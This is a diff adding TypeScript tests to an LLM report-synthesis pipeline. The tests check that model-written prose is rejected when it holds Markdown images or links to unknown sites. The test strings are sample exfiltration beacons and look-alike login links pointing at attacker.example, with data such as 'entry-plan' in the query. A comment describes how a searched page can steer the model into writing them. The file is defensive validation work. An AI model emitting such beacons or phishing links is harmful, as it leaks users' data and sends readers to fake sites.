@@ -377,6 +377,40 @@ describe("executeSynthesis — no-invention rule", () => {
 });
 
 // ---------------------------------------------------------------------------
+// executeSynthesis — links and images in the prose (OWASP LLM05)
+// ---------------------------------------------------------------------------
+
+describe("executeSynthesis — links and images in the prose", () => {
+  // A page the model searched can steer it into writing an image that a
+  // Markdown viewer fetches on open (a beacon carrying data in its query) or
+  // a link to a look-alike site. The prose may only point at upstream sources.
+  async function synthesize(prose: string): Promise<unknown> {
+    const ctx: SynthesisContext = { ...CTX_BASE, format: makeFormat() };
+    const provider = fakeLLM({ intro: { content_markdown: prose }, body: { content_markdown: "Body." } });
+    return executeSynthesis(ctx, provider).catch((e: unknown) => e);
+  }
+
+  test.each([
+    ["an image", "Growth is strong. ![chart](https://attacker.example/p.png?d=entry-plan)"],
+    ["an image to a known source", `![chart](${SOURCE_A.url})`],
+    ["a link to an unknown site", "See [the report](https://attacker.example/login)."],
+    ["a bare unknown URL", "Details at https://attacker.example/?q=board-memo today."],
+    ["a reference-style link", "See [the report][r].\n\n[r]: https://attacker.example/r"],
+  ])("refuses %s", async (_label, prose) => {
+    const err = await synthesize(prose);
+    expect(err).toBeInstanceOf(InvalidAgentOutputError);
+    expect((err as Error).message).toContain("section 'intro'");
+  });
+
+  test("a link to an upstream source is kept", async () => {
+    const result = (await synthesize(`Per [Precedent A](${SOURCE_A.url}), margins held.`)) as {
+      sections: { content_markdown: string }[];
+    };
+    expect(result.sections[0]!.content_markdown).toContain(SOURCE_A.url);
+  });
+});
+
+// ---------------------------------------------------------------------------
 // executeSynthesis — format conformance (forbidden_terms, over_length)
 // ---------------------------------------------------------------------------
 
